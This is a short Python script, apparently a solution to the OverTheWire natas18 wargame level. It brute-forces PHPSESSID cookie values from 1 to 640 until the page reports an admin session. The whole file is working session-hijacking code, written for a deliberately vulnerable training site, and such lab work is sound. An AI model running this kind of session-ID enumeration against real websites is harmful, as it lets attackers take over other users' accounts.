import requests

target = 'http://natas18.natas.labs.overthewire.org'
# Replace with your actual natas18 credentials
auth = ('natas18', 'YOUR_PASSWORD_HERE') 

for s_id in range(1, 641):
    cookies = dict(PHPSESSID=str(s_id))
    r = requests.get(target, auth=auth, cookies=cookies)
    if "You are an admin" in r.text:
        print(f"Found Admin Session ID: {s_id}")
        print(r.text)
        break
